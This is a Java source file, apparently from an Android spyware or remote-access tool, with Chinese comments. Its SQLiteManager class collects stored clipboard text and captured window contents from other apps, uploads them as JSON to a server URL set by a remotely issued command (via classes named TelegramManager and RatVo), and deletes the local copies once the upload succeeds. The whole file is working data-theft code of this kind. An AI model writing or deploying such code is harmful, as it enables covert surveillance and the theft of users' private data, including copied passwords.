package com.hhm.android.otherapp.managers;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.hhm.android.otherapp.Https.HttpRequest;
import com.hhm.android.otherapp.TelegramManager;
import com.hhm.android.otherapp.sqlite.ClipObject;
import com.hhm.android.otherapp.sqlite.LogObjects;
import com.hhm.android.otherapp.sqlite.SQLiteDao;
import com.hhm.android.otherapp.utils.RatVo;

import java.util.ArrayList;
import java.util.IllegalFormatCodePointException;

import io.reactivex.functions.Consumer;

import static com.hhm.android.otherapp.TelegramManager.GetCommon;
import static com.hhm.android.otherapp.TelegramManager.action_id;
import static com.hhm.android.otherapp.TelegramManager.context;

/**
 * @author huangche
 * @date 2020/12/30
 * 数据库数据获取
 *  clip 剪切板数据
 *  log  浏览器数据
 */
public class SQLiteManager {
    public static final String TAG = "SQLiteManager";

    // 获取浏览记录 log 列表
    public static void getLogList(Context context,int action_id,String url) {
        try {
            JsonArray list = new JsonArray();
            ArrayList<LogObjects> ObjectList = SQLiteDao.searchAndDeleteLogOfDb();
            for (LogObjects object:ObjectList){
                JsonObject logObject = new JsonObject();
                logObject.addProperty("log_id", object._id);
                logObject.addProperty("log_date" , object.timeStamp);
                logObject.addProperty("log_pakName",object.packageName);
                logObject.addProperty("log_content" , object.windowContent);
                list.add(logObject);
            }
            Datas(context,action_id,list,url,1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 获取剪贴板内容 clip 列表
    public static void getClipList(Context context,int action_id,String url) {
        try {
            JsonArray list = new JsonArray();
            ArrayList<ClipObject> objectList = SQLiteDao.searchAndDeleteClipOfDb();
            for (ClipObject object : objectList) {
                JsonObject logObject = new JsonObject();
                logObject.addProperty("clip_id", object._id);
                logObject.addProperty("clip_date" , object.timeStamp);
                logObject.addProperty("clip_msg" , object.clipBoardText);
                list.add(logObject);
            }
            Datas(context,action_id,list,url,0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 数据库表数据结果上报
    @SuppressLint("CheckResult")
    public static void Datas(Context context, int action_id, final JsonArray res_data, String url, final int type) {
        JsonObject params = new JsonObject();
        try {
            params.addProperty("action_id", action_id);
            params.addProperty("code", 0);
            params.addProperty("msg","success");
            params.add("res_data", res_data);
        } catch (Exception e){}
        HttpRequest.Datas(GetCommon(context), params, url)
                .subscribe(new Consumer<RatVo>() {
                    @Override
                    public void accept(RatVo ratVo) throws Exception {
                        if (ratVo.getCode() == 0) { // 上报成功
                            System.out.println("2020==数据库数据上报成功>");
                            if (type == 0) SQLiteDao.delete_clip();
                            if (type == 1) SQLiteDao.delete_log();
                        } else { // 上报失败
                            System.out.println("2020==数据库数据上报失败>");
                        }
                    }
                });
    }
}
